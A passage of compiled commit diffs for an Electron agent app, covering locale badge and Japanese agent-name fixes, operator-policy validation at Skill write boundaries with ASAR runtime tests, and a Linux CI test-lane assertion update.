-  "sync.conflict_resolution.message_batch": "Aiutami a risolvere questi conflitti di sincronizzazione cloud."
+  "sync.conflict_resolution.message_batch": "Aiutami a risolvere questi conflitti di sincronizzazione cloud.",
+  "quality.operator.incomplete": "La validazione personalizzata non è stata completata. Correggi il file delle regole o disattiva la validazione personalizzata nelle impostazioni, quindi riprova."
 }
```

---

### Incident Patch 3: `08fedee5` (2026-10-03)
**Commit Message**: fix(agents): show concise CLI brand badges

Display only CLI brand names on Agent cards in all 19 locales and use the runtime type when its localized label is unavailable. Keep card actions, runtime selection and escaping unchanged.

Validation: 144 focused tests, main/core-agent typechecks and isolated smoke passed on the final two-fix tree. Checked all 95 locale/brand combinations and four missing-label fallbacks. The inherited operator-policy locale gap is repaired separately.

**File**: `src/renderer/locales/ar.json` (modified, +5/-5)
```diff
@@ -1879,11 +1879,11 @@
   "agent_modal.runtime_cli_opencode": "OpenCode",
   "agent_modal.runtime_cli_hermes": "Hermes",
   "agent.external_word": "خارجي",
-  "agent.external_badge.claude": "خارجي · Claude Code",
-  "agent.external_badge.codex": "خارجي · Codex",
-  "agent.external_badge.openclaw": "خارجي · OpenClaw",
-  "agent.external_badge.opencode": "خارجي · OpenCode",
-  "agent.external_badge.hermes": "خارجي · Hermes",
+  "agent.external_badge.claude": "Claude Code",
+  "agent.external_badge.codex": "Codex",
+  "agent.external_badge.openclaw": "OpenClaw",
+  "agent.external_badge.opencode": "OpenCode",
+  "agent.external_badge.hermes": "Hermes",
   "agent.cli_not_found": "لم يُعثر على أداة CLI المحلية. ثبّتها أو اضبط مسارها.",
   "agent.cli_version_timeout": "انتهت مهلة التحقق من الإصدار. حاول مجددًا.",
   "agent.cli_version_unknown": "تعذّر تحديد الإصدار. حدّث أداة CLI أو تحقق من تثبيتها.",
```

**File**: `src/renderer/locales/de.json` (modified, +5/-5)
```diff
@@ -1879,11 +1879,11 @@
   "agent_modal.runtime_cli_opencode": "OpenCode",
   "agent_modal.runtime_cli_hermes": "Hermes",
   "agent.external_word": "Extern",
-  "agent.external_badge.claude": "Extern · Claude Code",
-  "agent.external_badge.codex": "Extern · Codex",
-  "agent.external_badge.openclaw": "Extern · OpenClaw",
-  "agent.external_badge.opencode": "Extern · OpenCode",
-  "agent.external_badge.hermes": "Extern · Hermes",
+  "agent.external_badge.claude": "Claude Code",
+  "agent.external_badge.codex": "Codex",
+  "agent.external_badge.openclaw": "OpenClaw",
+  "agent.external_badge.opencode": "OpenCode",
+  "agent.external_badge.hermes": "Hermes",
   "agent.cli_not_found": "Lokale CLI nicht gefunden. Installieren Sie sie oder konfigurieren Sie ihren Pfad.",
   "agent.cli_version_timeout": "Zeitüberschreitung bei der Versionsprüfung. Versuchen Sie es erneut.",
   "agent.cli_version_unknown": "Die Version konnte nicht ermittelt werden. Aktualisieren Sie die CLI oder prüfen Sie ihre Installation.",
```

**File**: `src/renderer/locales/en.json` (modified, +5/-5)
```diff
@@ -1879,11 +1879,11 @@
   "agent_modal.runtime_cli_opencode": "OpenCode",
   "agent_modal.runtime_cli_hermes": "Hermes",
   "agent.external_word": "External",
-  "agent.external_badge.claude": "External · Claude Code",
-  "agent.external_badge.codex": "External · Codex",
-  "agent.external_badge.openclaw": "External · OpenClaw",
-  "agent.external_badge.opencode": "External · OpenCode",
-  "agent.external_badge.hermes": "External · Hermes",
+  "agent.external_badge.claude": "Claude Code",
+  "agent.external_badge.codex": "Codex",
+  "agent.external_badge.openclaw": "OpenClaw",
+  "agent.external_badge.opencode": "OpenCode",
+  "agent.external_badge.hermes": "Hermes",
   "agent.cli_not_found": "Local CLI not found. Install it or configure its path.",
   "agent.cli_version_timeout": "Version check timed out. Try again.",
   "agent.cli_version_unknown": "Version could not be identified. Update the CLI or check its installation.",
```

**File**: `src/renderer/locales/es-419.json` (modified, +5/-5)
```diff
@@ -1879,11 +1879,11 @@
   "agent_modal.runtime_cli_opencode": "OpenCode",
   "agent_modal.runtime_cli_hermes": "Hermes",
   "agent.external_word": "Externo",
-  "agent.external_badge.claude": "Externo · Claude Code",
-  "agent.external_badge.codex": "Externo · Codex",
-  "agent.external_badge.openclaw": "Externo · OpenClaw",
-  "agent.external_badge.opencode": "Externo · OpenCode",
-  "agent.external_badge.hermes": "Externo · Hermes",
+  "agent.external_badge.claude": "Claude Code",
+  "agent.external_badge.codex": "Codex",
+  "agent.external_badge.openclaw": "OpenClaw",
+  "agent.external_badge.opencode": "OpenCode",
+  "agent.external_badge.hermes": "Hermes",
   "agent.cli_not_found": "No se encontró la CLI local. Instálala o configura su ruta.",
   "agent.cli_version_timeout": "Se agotó el tiempo de verificación de versión. Inténtalo de nuevo.",
   "agent.cli_version_unknown": "No se pudo identificar la versión. Actualiza la CLI o revisa su instalación.",
```

**File**: `src/renderer/locales/es.json` (modified, +5/-5)
```diff
@@ -1879,11 +1879,11 @@
   "agent_modal.runtime_cli_opencode": "OpenCode",
   "agent_modal.runtime_cli_hermes": "Hermes",
   "agent.external_word": "Externo",
-  "agent.external_badge.claude": "Externo · Claude Code",
-  "agent.external_badge.codex": "Externo · Codex",
-  "agent.external_badge.openclaw": "Externo · OpenClaw",
-  "agent.external_badge.opencode": "Externo · OpenCode",
-  "agent.external_badge.hermes": "Externo · Hermes",
+  "agent.external_badge.claude": "Claude Code",
+  "agent.external_badge.codex": "Codex",
+  "agent.external_badge.openclaw": "OpenClaw",
+  "agent.external_badge.opencode": "OpenCode",
+  "agent.external_badge.hermes": "Hermes",
   "agent.cli_not_found": "No se encontró la CLI local. Instálala o configura su ruta.",
   "agent.cli_version_timeout": "Se agotó el tiempo de comprobación de versión. Inténtalo de nuevo.",
   "agent.cli_version_unknown": "No se pudo identificar la versión. Actualiza la CLI o revisa su instalación.",
```

**File**: `src/renderer/locales/fr.json` (modified, +5/-5)
```diff
@@ -1879,11 +1879,11 @@
   "agent_modal.runtime_cli_opencode": "OpenCode",
   "agent_modal.runtime_cli_hermes": "Hermes",
   "agent.external_word": "Externe",
-  "agent.external_badge.claude": "Externe · Claude Code",
-  "agent.external_badge.codex": "Externe · Codex",
-  "agent.external_badge.openclaw": "Externe · OpenClaw",
-  "agent.external_badge.opencode": "Externe · OpenCode",
-  "agent.external_badge.hermes": "Externe · Hermes",
+  "agent.external_badge.claude": "Claude Code",
+  "agent.external_badge.codex": "Codex",
+  "agent.external_badge.openclaw": "OpenClaw",
+  "agent.external_badge.opencode": "OpenCode",
+  "agent.external_badge.hermes": "Hermes",
   "agent.cli_not_found": "CLI locale introuvable. Installez-la ou configurez son chemin.",
   "agent.cli_version_timeout": "Délai de vérification de version dépassé. Réessayez.",
   "agent.cli_version_unknown": "Impossible d’identifier la version. Mettez à jour la CLI ou vérifiez son installation.",
```

**File**: `src/renderer/locales/hi.json` (modified, +5/-5)
```diff
@@ -1879,11 +1879,11 @@
   "agent_modal.runtime_cli_opencode": "OpenCode",
   "agent_modal.runtime_cli_hermes": "Hermes",
   "agent.external_word": "बाहरी",
-  "agent.external_badge.claude": "बाहरी · Claude Code",
-  "agent.external_badge.codex": "बाहरी · Codex",
-  "agent.external_badge.openclaw": "बाहरी · OpenClaw",
-  "agent.external_badge.opencode": "बाहरी · OpenCode",
-  "agent.external_badge.hermes": "बाहरी · Hermes",
+  "agent.external_badge.claude": "Claude Code",
+  "agent.external_badge.codex": "Codex",
+  "agent.external_badge.openclaw": "OpenClaw",
+  "agent.external_badge.opencode": "OpenCode",
+  "agent.external_badge.hermes": "Hermes",
   "agent.cli_not_found": "स्थानीय CLI नहीं मिला। उसे इंस्टॉल करें या उसका पथ कॉन्फ़िगर करें।",
   "agent.cli_version_timeout": "संस्करण जाँच का समय समाप्त हुआ। फिर कोशिश करें।",
   "agent.cli_version_unknown": "संस्करण पहचाना नहीं जा सका। CLI अपडेट करें या उसका इंस्टॉलेशन जाँचें।",
```

**File**: `src/renderer/locales/id.json` (modified, +5/-5)
```diff
@@ -1879,11 +1879,11 @@
   "agent_modal.runtime_cli_opencode": "Kode Terbuka",
   "agent_modal.runtime_cli_hermes": "Hermes",
   "agent.external_word": "Eksternal",
-  "agent.external_badge.claude": "Eksternal · Kode Claude",
-  "agent.external_badge.codex": "Eksternal · Codex",
-  "agent.external_badge.openclaw": "Eksternal · OpenClaw",
-  "agent.external_badge.opencode": "Eksternal · OpenCode",
-  "agent.external_badge.hermes": "Eksternal · Hermes",
+  "agent.external_badge.claude": "Claude Code",
+  "agent.external_badge.codex": "Codex",
+  "agent.external_badge.openclaw": "OpenClaw",
+  "agent.external_badge.opencode": "OpenCode",
+  "agent.external_badge.hermes": "Hermes",
   "agent.cli_not_found": "CLI lokal tidak ditemukan. Instal atau konfigurasikan jalurnya.",
   "agent.cli_version_timeout": "Pemeriksaan versi habis waktunya. Coba lagi.",
   "agent.cli_version_unknown": "Versi tidak dapat diidentifikasi. Perbarui CLI atau periksa instalasinya.",
```

---

### Incident Patch 4: `6f2158b3` (2026-10-02)
**Commit Message**: Use native archive lookup paths in the Windows ASAR fixture

**File**: `test/main/quality/operator-policy-asar.test.ts` (modified, +1/-1)
```diff
@@ -33,7 +33,7 @@ describe('operator policy packaged runtime', () => {
       // Windows must not read or remove the fixture until that close completes.
       const output = await createPackageWithOptions(stage, archive, { unpack: `{${unpack.join(',')}}` });
       await finished(output);
-      expect(statFile(archive, 'src/main/quality/operator-worker.js').unpacked).not.toBe(true);
+      expect(statFile(archive, path.join('src', 'main', 'quality', 'operator-worker.js')).unpacked).not.toBe(true);
       const launcher = path.join(root, 'launch.cjs');
       fs.writeFileSync(launcher, `
         require('node:module').createRequire(require('node:path').join(__dirname, 'app.asar', 'entry.cjs'))('tsx/cjs');
```

---

### Incident Patch 5: `582f0b9f` (2026-10-02)
**Commit Message**: Wait for ASAR fixture archive handles before runtime checks

**File**: `test/main/quality/operator-policy-asar.test.ts` (modified, +9/-2)
```diff
@@ -1,6 +1,7 @@
 import { describe, expect, it } from 'vitest';
 import { createRequire } from 'node:module';
 import { spawnSync } from 'node:child_process';
+import { finished } from 'node:stream/promises';
 import * as fs from 'node:fs';
 import * as os from 'node:os';
 import * as path from 'node:path';
@@ -28,7 +29,10 @@ describe('operator policy packaged runtime', () => {
         copy(`node_modules/${dep}`);
       }
       const unpack = build.asarUnpack.map((pattern: string) => path.join(stage, pattern).replaceAll('\\', '/'));
-      await createPackageWithOptions(stage, archive, { unpack: `{${unpack.join(',')}}` });
+      // asar 3 returns its output stream before the archive handle closes.
+      // Windows must not read or remove the fixture until that close completes.
+      const output = await createPackageWithOptions(stage, archive, { unpack: `{${unpack.join(',')}}` });
+      await finished(output);
       expect(statFile(archive, 'src/main/quality/operator-worker.js').unpacked).not.toBe(true);
       const launcher = path.join(root, 'launch.cjs');
       fs.writeFileSync(launcher, `
@@ -63,6 +67,9 @@ describe('operator policy packaged runtime', () => {
       const result = spawnSync(process.execPath, [launcher], { cwd: root, env, encoding: 'utf8', timeout: 20000 });
       expect(result.status, result.stderr || result.stdout || String(result.error)).toBe(0);
       expect(result.stdout).toContain('POLICY_ASAR_OK');
-    } finally { fs.rmSync(root, { recursive: true, force: true }); }
+    } finally {
+      // Electron's fs wrapper treats ASARs as directories; delete the real archive.
+      require('original-fs').rmSync(root, { recursive: true, force: true, maxRetries: 5, retryDelay: 100 });
+    }
   }, 30000);
 });
```

---

### Incident Patch 6: `195ac65a` (2026-10-02)
**Commit Message**: Fix operator policy validation at Skill write boundaries

Canonicalize accepted file paths before policy classification, validate the exact normalized metadata written by create/edit flows, and propagate editor cancellation through inline writes. Exercise the real ASAR Worker and write regressions in the platform matrix.

**File**: `.github/workflows/native-dependencies.yml` (modified, +6/-0)
```diff
@@ -62,3 +62,9 @@ jobs:
           test/main/util/ensure-deps.test.ts
           test/main/util/ensure-dev-dependencies.test.ts
           test/main/util/linux-source-dependencies.test.ts
+      - name: Verify operator policy Worker, ASAR runtime and write boundaries
+        run: >-
+          npm run test:js -- --maxWorkers=1
+          test/main/quality/operator-policy.test.ts
+          test/main/quality/operator-policy-asar.test.ts
+          test/main/features/skills.test.ts
```

**File**: `src/main/features/skills.ts` (modified, +109/-78)
```diff
@@ -428,8 +428,7 @@ function readSkillOrkasMetaSync(dir: string): SkillOrkasMeta {
   }
 }
 
-function writeSkillOrkasMetaSync(dir: string, patch: SkillOrkasMeta): void {
-  const current = readSkillOrkasMetaSync(dir);
+function mergeSkillOrkasMeta(current: SkillOrkasMeta, patch: SkillOrkasMeta): SkillOrkasMeta {
   const next: SkillOrkasMeta = { ...current };
   if (Object.prototype.hasOwnProperty.call(patch, 'category')) {
     const raw = typeof patch.category === 'string' ? patch.category.trim() : '';
@@ -469,7 +468,11 @@ function writeSkillOrkasMetaSync(dir: string, patch: SkillOrkasMeta): void {
     if (clean) next.state = clean;
     else delete next.state;
   }
-  writeJsonSync(skillMetaFile(dir), next);
+  return next;
+}
+
+function writeSkillOrkasMetaSync(dir: string, patch: SkillOrkasMeta): void {
+  writeJsonSync(skillMetaFile(dir), mergeSkillOrkasMeta(readSkillOrkasMetaSync(dir), patch));
 }
 
 function _stripSkillSidecarDescriptions(meta: SkillOrkasMeta): SkillOrkasMeta {
@@ -1162,7 +1165,7 @@ export async function createCustomSkill(
   const uid = getActiveUserId();
   const reports = await validateWithOperatorPolicy(uid, { kind: 'files', files: [
     { relpath: 'SKILL.md', content: skillMdContent(name, description, '', category, 'approved') },
-    { relpath: '_meta.json', content: JSON.stringify({ category, status: 'approved' }) },
+    { relpath: '_meta.json', content: JSON.stringify(mergeSkillOrkasMeta({}, { category, status: 'approved' }), null, 2) },
   ] });
   if (uid !== getActiveUserId() || reports.some(hasBlockingOperatorPolicy)) throw new Error(t('quality.operator.incomplete'));
   return _createCustomSkillSync(name, description, category);
@@ -1216,7 +1219,7 @@ export async function updateCustomSkill(
     description_en?: string;
     category?: string;
   },
-  options: { skipRename?: boolean } = {},
+  options: { skipRename?: boolean; isCancelled?: () => boolean } = {},
 ): Promise<CustomSkill | null> {
   const userId = getActiveUserId();
   let d = customSkillDir(skillId, userId);
@@ -1248,11 +1251,17 @@ export async function updateCustomSkill(
     ? String(updates.category || '')
     : ((meta.category as string) || '');
 
+  const sidecar = readSkillOrkasMetaSync(d);
+  const proposedSidecar = _stripSkillSidecarDescriptions(mergeSkillOrkasMeta(sidecar, {
+    category: newCategory,
+    status: String(meta.status || meta.state || sidecar.status || 'approved'),
+  }));
+  delete proposedSidecar._import;
   const policyReports = await validateWithOperatorPolicy(userId, { kind: 'files', files: [
     { relpath: 'SKILL.md', content: skillMdContent(newName, { zh: newZh, en: newEn }, body) },
-    { relpath: '_meta.json', content: JSON.stringify({ ...readSkillOrkasMetaSync(d), category: newCategory }) },
+    { relpath: '_meta.json', content: JSON.stringify(proposedSidecar, null, 2) },
   ] });
-  if (userId !== getActiveUserId() || policyReports.some(hasBlockingOperatorPolicy)) throw new Error(t('quality.operator.incomplete'));
+  if (userId !== getActiveUserId() || options.isCancelled?.() || policyReports.some(hasBlockingOperatorPolicy)) throw new Error(t('quality.operator.incomplete'));
   let currentId = skillId;
   // `skipRename` is the in-progress-edit hook used by the skill detail name
   // editor: while the user is typing, write the new `name:` into SKILL.md
@@ -1305,12 +1314,7 @@ export async function updateCustomSkill(
   }
 
   writeTextAtomicSync(md, skillMdContent(newName, { zh: newZh, en: newEn }, body));
-  writeSkillOrkasMetaSync(d, {
-    ...(newCategory ? { category: newCategory } : { category: '' }),
-    status: String(meta.status || meta.state || readSkillOrkasMetaSync(d).status || 'approved'),
-  });
-  removeSkillSidecarDescriptionsSync(d);
-  clearSkillImportDraftMarkerSync(currentId);
+  writeJsonSync(skillMetaFile(d), proposedSidecar);
   log.info(`updated name=${currentId} category=${newCategory || '(none)'}`);
   _invalidateSkillListCache({ userId });
   invalidateCoreAgentSkills().catch(() => { /* runner may not be loaded yet */ });
@@ -2190,7 +2194,8 @@ export async function importSkillPackageFromPath(sourcePath: string): Promise<Im
  *
  * Returns the new id if renamed, null otherwise.
  */
-async function _renameSkillByFrontmatterIfNeeded(currentId: string): Promise<string | null> {
+async function _renameSkillByFrontmatterIfNeeded(currentId: string, isCancelled?: () => boolean): Promise<string | null> {
+  if (isCancelled?.()) return null;
   const md = path.join(customSkillDir(currentId), 'SKILL.md');
   if (!fs.existsSync(md)) return null;
   let meta: SkillFrontmatter;
@@ -2203,7 +2208,7 @@ async function _renameSkillByFrontmatterIfNeeded(currentId: string): Promise<str
   if (fs.existsSync(customSkillDir(intended))) return null;
   if (fs.existsSync(path.join(userMarketplaceSkillsDir(getActiveUserId()), intended))) return null;
   try {
-    const updated = await updateCustomSkill(currentId, { name: intended });
+    const updated = awa
```

**File**: `test/main/features/skills.test.ts` (modified, +75/-0)
```diff
@@ -2869,3 +2869,78 @@ describe('skills › operator policy write gates', () => {
     expect(fs.existsSync(path.join(customSkillsDir(), 'policy-meta', '_meta.json'))).toBe(false);
   });
 });
+
+function enableCommitBoundaryPolicy(rules: unknown[]) {
+  const config = path.join(tmpDir, TEST_UID, 'local', 'config');
+  fs.mkdirSync(config, { recursive: true });
+  fs.writeFileSync(path.join(config, 'operator-policy-enabled.json'), '{"enabled":true}');
+  fs.writeFileSync(path.join(config, 'operator-policy.json'), JSON.stringify({version: 1, rules}));
+}
+describe('skills › operator policy commit boundary', () => {
+  it('applies the same policy to the canonical Skill path and its accepted write alias', async () => {
+    writeCustomSkill('alias');
+    enableCommitBoundaryPolicy([{id:'private',level:'EXTREME',pattern:'private-resource',appliesTo:['skill_md']}]);
+    const s = await loadSkills();
+    const payload = '---\nname: alias\ndescription: test\n---\n```bash\necho private-resource\n```';
+    expect((await s.writeCustomSkillFileChecked('alias', 'SKILL.md', payload)).ok).toBe(false);
+    for (const alias of ['/SKILL.md', ' skill.md ']) {
+      expect((await s.writeCustomSkillFileChecked('alias', alias, payload)).ok).toBe(false);
+    }
+    const persisted = fs.readFileSync(path.join(customSkillsDir(),'alias','SKILL.md'),'utf8');
+    expect(persisted).not.toContain('private-resource');
+  });
+  it('checks metadata aliases before replacing the canonical sidecar', async () => {
+    writeCustomSkill('meta-alias');
+    enableCommitBoundaryPolicy([{ id: 'private', level: 'EXTREME', pattern: 'private-resource', appliesTo: ['skill_meta'] }]);
+    const s = await loadSkills();
+    for (const alias of ['/_meta.json', '_META.JSON']) {
+      expect((await s.writeCustomSkillFileChecked('meta-alias', alias, '{"category":"private-resource"}')).ok).toBe(false);
+    }
+    expect(fs.existsSync(path.join(customSkillsDir(), 'meta-alias', '_meta.json'))).toBe(false);
+  });
+  it('checks normalized metadata bytes that will be persisted', async () => {
+    writeCustomSkill('category');
+    enableCommitBoundaryPolicy([{id:'no_creation',level:'EXTREME',pattern:'creation',appliesTo:['skill_meta']}]);
+    const s = await loadSkills();
+    const result = await s.applySkillMetadataForEdit('category', {category:'writing'});
+    const file=path.join(customSkillsDir(),'category','_meta.json');
+    const persisted=fs.existsSync(file) ? fs.readFileSync(file,'utf8') : '';
+    expect(result.ok).toBe(false);
+    expect(persisted).not.toContain('creation');
+  });
+  it('checks the final creation status from legacy frontmatter', async () => {
+    enableCommitBoundaryPolicy([{id:'no_draft',level:'EXTREME',pattern:'draft',appliesTo:['skill_meta']}]);
+    const s=await loadSkills();
+    const result=await s.applySkillContainerFromCommander({raw:'',files:[{path:'SKILL.md',content:'---\nname: status-case\ndescription: Test\nstatus: draft\n---\nBody'}]});
+    const file=path.join(customSkillsDir(),'status-case','_meta.json');
+    const persisted=fs.existsSync(file) ? fs.readFileSync(file,'utf8') : '';
+    expect(result.ok).toBe(false);
+    expect(persisted).not.toContain('draft');
+  });
+  for (const kind of ['file','metadata']) {
+    it(`does not persist inline ${kind} after Stop during policy validation`, async () => {
+      writeCustomSkill('cancelled');
+      enableCommitBoundaryPolicy([]);
+      const controller = new AbortController();
+      const policy = await import('../../../src/main/features/operator-policy');
+      const original = policy.validateWithOperatorPolicy;
+      const spy = vi.spyOn(policy, 'validateWithOperatorPolicy').mockImplementation(async (...args) => {
+        const result = await original(...args);
+        controller.abort();
+        return result;
+      });
+      streamImpl.current = async function* () {
+        yield {type:'final',text: kind === 'file'
+          ? '<<<skill-file path=notes.md\nchanged after stop\n>>>'
+          : '<skill-meta><category>data</category></skill-meta>'};
+      };
+      try {
+        const s = await loadSkills();
+        for await (const event of s.streamSendToSkillChat(TEST_UID,'cancelled','edit',{abortSignal:controller.signal})) {}
+        const target=path.join(customSkillsDir(),'cancelled',kind==='file'?'notes.md':'_meta.json');
+        expect(controller.signal.aborted).toBe(true);
+        expect(fs.existsSync(target)).toBe(false);
+      } finally { spy.mockRestore(); }
+    });
+  }
+});
```

**File**: `test/main/quality/operator-policy-asar.test.ts` (added, +68/-0)
```diff
@@ -0,0 +1,68 @@
+import { describe, expect, it } from 'vitest';
+import { createRequire } from 'node:module';
+import { spawnSync } from 'node:child_process';
+import * as fs from 'node:fs';
+import * as os from 'node:os';
+import * as path from 'node:path';
+
+const require = createRequire(import.meta.url);
+const { createPackageWithOptions, statFile } = require('@electron/asar');
+
+describe('operator policy packaged runtime', () => {
+  it('loads the real Worker from ASAR, enforces rules, terminates slow regex and recovers', async () => {
+    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'orkas-policy-asar-'));
+    try {
+      const stage = path.join(root, 'stage');
+      const archive = path.join(root, 'app.asar');
+      const copy = (relative: string) => {
+        const target = path.join(stage, relative);
+        fs.mkdirSync(path.dirname(target), { recursive: true });
+        fs.cpSync(path.join(process.cwd(), relative), target, { recursive: true });
+      };
+      copy('src/main/quality');
+      copy('src/main/util/token-estimate.ts');
+      copy('src/main/util/skill-description-policy.ts');
+      const build = require('../../../package.json').build;
+      for (const dep of ['tsx', 'get-tsconfig', 'resolve-pkg-maps', 'esbuild', '@esbuild']) {
+        expect(build.asarUnpack).toContain(`node_modules/${dep}/**/*`);
+        copy(`node_modules/${dep}`);
+      }
+      const unpack = build.asarUnpack.map((pattern: string) => path.join(stage, pattern).replaceAll('\\', '/'));
+      await createPackageWithOptions(stage, archive, { unpack: `{${unpack.join(',')}}` });
+      expect(statFile(archive, 'src/main/quality/operator-worker.js').unpacked).not.toBe(true);
+      const launcher = path.join(root, 'launch.cjs');
+      fs.writeFileSync(launcher, `
+        require('node:module').createRequire(require('node:path').join(__dirname, 'app.asar', 'entry.cjs'))('tsx/cjs');
+        const { runOperatorPolicy } = require('./app.asar/src/main/quality');
+        const assert = require('node:assert/strict');
+        const policy = pattern => JSON.stringify({ version: 1, rules: [{ id: 'blocked', level: 'EXTREME', pattern }] });
+        const request = content => ({ kind: 'files', files: [{ relpath: 'run.sh', content }] });
+        (async () => {
+          const hit = await runOperatorPolicy(policy('private-resource'), request('echo private-resource'));
+          assert.equal(hit.reports?.[0].ok, false, JSON.stringify(hit));
+          assert.ok(hit.reports[0].violations.some(v => v.rule === 'operator:blocked'));
+          let ticks = 0;
+          const timer = setInterval(() => ticks++, 10);
+          const slow = await runOperatorPolicy(policy('^(a+)+$'), request('a'.repeat(31) + '!'));
+          clearInterval(timer);
+          assert.equal(slow.error, 'timeout');
+          assert.ok(ticks > 10);
+          const next = await runOperatorPolicy(policy('private-resource'), request('echo safe'));
+          assert.equal(next.reports?.[0].ok, true, JSON.stringify(next));
+          process.stdout.write('POLICY_ASAR_OK');
+        })().catch(e => { console.error(e); process.exitCode = 1; });
+      `);
+      // Match bootstrap.cjs: esbuild's executable must use its real unpacked path.
+      const env = { ...process.env, ELECTRON_RUN_AS_NODE: '1', ESBUILD_BINARY_PATH: path.join(
+        `${archive}.unpacked`, 'node_modules', '@esbuild', `${process.platform}-${process.arch}`,
+        ...(process.platform === 'win32' ? ['esbuild.exe'] : ['bin', 'esbuild']),
+      ) };
+      expect(fs.existsSync(env.ESBUILD_BINARY_PATH)).toBe(true);
+      delete env.NODE_OPTIONS;
+      delete env.NODE_PATH;
+      const result = spawnSync(process.execPath, [launcher], { cwd: root, env, encoding: 'utf8', timeout: 20000 });
+      expect(result.status, result.stderr || result.stdout || String(result.error)).toBe(0);
+      expect(result.stdout).toContain('POLICY_ASAR_OK');
+    } finally { fs.rmSync(root, { recursive: true, force: true }); }
+  }, 30000);
+});
```

---

### Incident Patch 7: `71a69e54` (2026-10-02)
**Commit Message**: Merge pull request #99 from YToolbox/codex/fix-japanese-agent-names-20261002

fix(agents): keep Japanese default and suggested names valid

**File**: `src/main/locales/ja.json` (modified, +1/-1)
```diff
@@ -218,7 +218,7 @@
   "attachments.skipped.too_many_images": "メッセージあたりの画像上限を超えました（{max}）",
   "attachments.skipped.compress_failed": "画像圧縮に失敗しました: {message}",
   "chat.default_title": "新しい会話",
-  "agent.default_name": "無題のエージェント",
+  "agent.default_name": "名称未設定",
   "dialog.choose_directory": "ディレクトリを選択",
   "dialog.choose_skill_source_directory": "インポートするスキルフォルダを選択",
   "contexts.index.heading": "ライブラリインデックス",
```

**File**: `src/renderer/locales/ja.json` (modified, +1/-1)
```diff
@@ -1855,7 +1855,7 @@
   "agent_modal.tab_external": "外部",
   "agent_modal.name": "名前",
   "agent_modal.category": "カテゴリ",
-  "agent_modal.name_placeholder": "例: コードレビューアシスタント",
+  "agent_modal.name_placeholder": "例: SNS担当",
   "agent_modal.desc": "概要",
   "agent_modal.desc_hint": "何をするかを 1 行で入力します。AI がワークフローを生成します",
   "agent_modal.desc_placeholder": "例: コミット前にコードをレビューし、ロジックバグとセキュリティ問題に注目する...",
```

**File**: `test/main/features/agents.test.ts` (modified, +1/-0)
```diff
@@ -1308,6 +1308,7 @@ describe('agents › createCustomAgent', () => {
     ['tr', 'KodIncelemeAsistani'],
     ['vi', 'TroLyDanhGiaMa'],
     ['zh-tw', '程式碼審查助手'],
+    ['ja', 'SNS担当'],
     ['pt-pt', 'AssistenteRevisaoCodigo'],
     ['es-419', 'AsistenteRevisionCodigo'],
   ] as const)('keeps default and suggested Agent names editable in %s', async (lang, suggestedName) => {
```

---

### Incident Patch 8: `2b5032da` (2026-10-02)
**Commit Message**: fix(agents): keep Japanese default and suggested names valid

Use names accepted by the existing mention and name validation contract in Japanese. Cover creating, saving, renaming, and persisting an Agent with the localized default and suggested name.

**File**: `src/main/locales/ja.json` (modified, +1/-1)
```diff
@@ -218,7 +218,7 @@
   "attachments.skipped.too_many_images": "メッセージあたりの画像上限を超えました（{max}）",
   "attachments.skipped.compress_failed": "画像圧縮に失敗しました: {message}",
   "chat.default_title": "新しい会話",
-  "agent.default_name": "無題のエージェント",
+  "agent.default_name": "名称未設定",
   "dialog.choose_directory": "ディレクトリを選択",
   "dialog.choose_skill_source_directory": "インポートするスキルフォルダを選択",
   "contexts.index.heading": "ライブラリインデックス",
```

**File**: `src/renderer/locales/ja.json` (modified, +1/-1)
```diff
@@ -1855,7 +1855,7 @@
   "agent_modal.tab_external": "外部",
   "agent_modal.name": "名前",
   "agent_modal.category": "カテゴリ",
-  "agent_modal.name_placeholder": "例: コードレビューアシスタント",
+  "agent_modal.name_placeholder": "例: SNS担当",
   "agent_modal.desc": "概要",
   "agent_modal.desc_hint": "何をするかを 1 行で入力します。AI がワークフローを生成します",
   "agent_modal.desc_placeholder": "例: コミット前にコードをレビューし、ロジックバグとセキュリティ問題に注目する...",
```

**File**: `test/main/features/agents.test.ts` (modified, +1/-0)
```diff
@@ -1308,6 +1308,7 @@ describe('agents › createCustomAgent', () => {
     ['tr', 'KodIncelemeAsistani'],
     ['vi', 'TroLyDanhGiaMa'],
     ['zh-tw', '程式碼審查助手'],
+    ['ja', 'SNS担当'],
     ['pt-pt', 'AssistenteRevisaoCodigo'],
     ['es-419', 'AsistenteRevisionCodigo'],
   ] as const)('keeps default and suggested Agent names editable in %s', async (lang, suggestedName) => {
```

---

### Incident Patch 9: `365cb338` (2026-10-01)
**Commit Message**: Validate the managed Linux desktop test lane

Update the CI inventory assertion for the window-manager wrapper while retaining virtual-display, readiness ordering, dependency provisioning and native lane requirements. The old exact command check failed after the necessary CI environment repair; all 11 owning cases now pass. Product and GUI canary assertions remain unchanged.

**File**: `test/main/util/linux-source-dependencies.test.ts` (modified, +9/-2)
```diff
@@ -148,7 +148,14 @@ describe('Linux source dependency contract', () => {
     expect(workflow).toMatch(/run:\s+npm ci\s*$/m);
     expect(workflow).not.toContain('npm ci --ignore-scripts');
     expect(workflow).toContain('node scripts/ensure-dev-dependencies.cjs');
-    expect(workflow).toContain('xvfb-run --auto-servernum npm run test:platform-native');
+    const nativeLane = workflow.split('- name: Run Linux platform-native test lane')[1]?.split('- name:')[0] ?? '';
+    expect(nativeLane).toContain('xvfb-run --auto-servernum');
+    expect(nativeLane).toContain('openbox --sm-disable');
+    expect(nativeLane).toContain('xprop -root _NET_SUPPORTING_WM_CHECK');
+    expect(nativeLane).toContain('npm run test:platform-native');
+    expect(nativeLane.indexOf('xprop -root _NET_SUPPORTING_WM_CHECK')).toBeLessThan(
+      nativeLane.indexOf('npm run test:platform-native'),
+    );
     expect(workflow).toContain('ORKAS_E2E_SHOW_WINDOW=1 xvfb-run --auto-servernum');
     expect(workflow).toContain('test/e2e/app_e2e_smoke.spec.ts');
     expect(workflow).toContain('xvfb-run --auto-servernum npm run test:linux-source');
@@ -169,7 +176,7 @@ describe('Linux source dependency contract', () => {
     expect(dependencyProvisioner).toContain("run('Linux source dependencies'");
 
     expect(workflow.indexOf('node scripts/ensure-dev-dependencies.cjs')).toBeLessThan(
-      workflow.indexOf('xvfb-run --auto-servernum npm run test:platform-native'),
+      workflow.indexOf('npm run test:platform-native'),
     );
 
     const launcher = fs.readFileSync(path.join(process.cwd(), 'run.sh'), 'utf8');
```

---

### Incident Patch 10: `d7348b8f` (2026-10-01)
**Commit Message**: Provide a window manager for Linux desktop canaries

